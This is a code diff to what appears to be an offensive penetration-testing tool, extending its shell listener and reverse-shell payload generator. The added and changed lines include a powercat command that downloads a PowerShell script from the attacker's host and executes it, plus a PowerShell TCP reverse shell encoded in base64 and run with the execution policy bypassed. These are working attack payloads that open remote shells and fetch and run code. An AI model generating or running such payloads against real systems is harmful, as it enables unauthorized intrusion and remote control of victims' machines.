@@ -14,6 +14,7 @@ import paramiko
 import readline
 import base64
 import select
+import pwnlib
 
 
 try:
@@ -178,7 +179,11 @@ class ShellListener:
         return output
 
     def print_message(self, data):
-        sys.stdout.write(data.decode())
+        try:
+            data = data.decode()
+        except:
+            data = str(data)  # workaround so the shell doesn't die 
+        sys.stdout.write(data)
         sys.stdout.flush()
 
     def interactive(self):
@@ -394,11 +399,19 @@ def generate_payload(payload_type, local_address, port, index=None, **kwargs):
         payload = f"xterm -display {local_address}:1"
     elif payload_type == "powercat":
         shell = kwargs.get("shell", "cmd")
-        return f"powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{local_address}/powercat.ps1');powercat -c {local_address} -p {port} -e {shell}\""
+        http_port = kwargs.get("http_port", 80)
+        return f"powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://{local_address}:{http_port}/powercat.ps1');powercat -c {local_address} -p {port} -e {shell}\""
     elif payload_type == "powershell":
         payload = '$a=New-Object System.Net.Sockets.TCPClient("%s",%d);$d=$a.GetStream();[byte[]]$k=0..65535|%%{0};while(($i=$d.Read($k,0,$k.Length)) -ne 0){;$o=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($k,0,$i);$q=(iex $o 2>&1|Out-String);$c=$q+"$ ";$b=([text.encoding]::ASCII).GetBytes($c);$d.Write($b,0,$b.Length);$d.Flush()};$a.Close();' % (local_address, port)
-        payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
-        payload = f"powershell.exe -exec bypass -enc {payload_encoded}"
+        if kwargs.get("method", "process") == "process":
+            payload_encoded = base64.b64encode(payload.encode("UTF-16LE")).decode()
+            execution_policy = kwargs.get("execution_policy", "bypass")
+            flags = ["-EncodedCommand", payload_encoded]
+            if execution_policy is not None:
+                flags.append("-ExecutionPolicy")
+                flags.append(execution_policy)
+            flags = " ".join(flags)
+            payload = f"powershell.exe {flags}"
     else:
         payload = None
         print("[-] Unknown payload type:", payload_type)
